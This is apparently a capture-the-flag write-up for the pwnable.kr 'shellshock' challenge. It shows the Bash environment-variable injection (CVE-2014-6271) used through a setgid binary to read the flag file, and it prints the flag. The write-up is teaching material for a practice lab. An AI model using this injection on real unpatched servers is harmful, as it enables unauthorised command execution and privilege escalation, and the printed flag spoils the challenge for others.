# shellshock

1. Login into server with passwd: `guest`:
```
$ ssh shellshock@pwnable.kr -p2222
$ scp -P2222 shellshock@pwnable.kr:~/* .
```

2. Taking a look at the source code, we see that the only thing taht the program does is setting the real user/group ID, the effective user/group ID, and the saved set-user/group-ID of the calling process to its effective group id.
That's good, because in other way we wouldn't be able to read the flag, as it needs to be read by user being in `shellshock_pwn` group. The program is running with th GID of the owner, which is `shellshock_pwn`. The same as GID of the flag (as shown below):
```
shellshock@prowl:~$ ls
bash  flag  shellshock  shellshock.c
shellshock@prowl:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 114 root root             4096 May 19 15:59 ..
d---------   2 root root             4096 Oct 12  2014 .bash_history
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
shellshock@prowl:~$ id
uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)
```
As title says, the shellshock was the vulnerability of `bash` found on 24.09.2014. It allowed an attacker to execute arbitrary commands on the vulnerable versions of the `bash` [https://en.wikipedia.org/wiki/Shellshock_(software_bug)].

The exploit which we can use if our bash version is vulnerable looks like this:
```
$ env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"

shellshock@prowl:~$ env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
vulnerable
this is a test
```
Yeah, we have vulnerable version, we can now easily try to use to get a flag:
```
$ env x='() { :;}; /bin/cat flag' ./shellshock

shellshock@prowl:~$  env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!   
Segmentation fault (core dumped)
```

And yeah, we got the flag:
```
FLAG: {only if I knew CVE-2014-6271 ten years ago..!! }
```